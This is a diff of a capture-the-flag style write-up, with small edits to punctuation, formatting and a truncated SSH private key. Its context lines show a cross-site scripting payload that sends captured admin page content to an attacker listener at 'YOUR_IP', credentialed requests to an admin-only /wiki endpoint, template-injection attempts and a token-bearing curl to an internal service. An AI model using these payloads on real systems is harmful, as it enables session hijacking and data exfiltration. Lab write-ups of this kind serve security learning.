@@ -118,6 +118,7 @@ fetch('http://YOUR_IP:8000/?y=' + btoa(text), {mode:'no-cors'});
 ```
 
 With this payload we start getting hits the show an admin page  with a couple of links:
+
 ```html
   <h1>Dashboard</h1>
   </header>
@@ -133,7 +134,7 @@ With this payload we start getting hits the show an admin page  with a couple of
             ...
 ```
 
-This suggests that we are actually targeting an admin user logged into thehub-int (it has access to `/wiki`, which we know from the previous gobuster): so let's try to have a look at this endpoint:
+This suggests that we are actually targeting an admin user logged into thehub-int (it has access to `/wiki`, which we know from the previous gobuster). So let's try to have a look at this endpoint:
 
 ```javascript
 fetch("/wiki", {method:'GET',mode:'no-cors',credentials:'same-origin'})
@@ -164,7 +165,7 @@ that we can visit to learn about this form:
 ```
 
 
-We are now ready to try posting to `/wiki` and see what happens.  Our first idea was trying to see if there is some kind of template injection
+We are now ready to try posting to `/wiki` and see what happens.  Our first idea was trying to see if there is some kind of template injection:
 
 ```javascript
 const formData = new URLSearchParams({
@@ -269,9 +270,7 @@ index b75271c..0000000
 +++ /dev/null
 @@ -1,49 +0,0 @@
 ------BEGIN OPENSSH PRIVATE KEY-----
--b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
--NhAAAAAwEAAQAAAgEAiwE9MNksoiRnOKAREB28jqwNr41Izx1MHyvcw+1ttqT0Mm6d+qAD
-...
+-b3BlbnNzaC1rZXktdjEAAAAA...
 ```
 
 From `.git/config` we also notice that the repository is probably accessible from the external host ip address:
@@ -376,7 +375,7 @@ curl 172.16.1.2:3000/modify-resolv -X POST -H "Authorization: Bearer ${TOKEN}" ;
 
 ```
 
-that can be used with the corresponding jwks.json
+that can be used with the corresponding `jwks.json`
 
 ```json
 {"keys": [
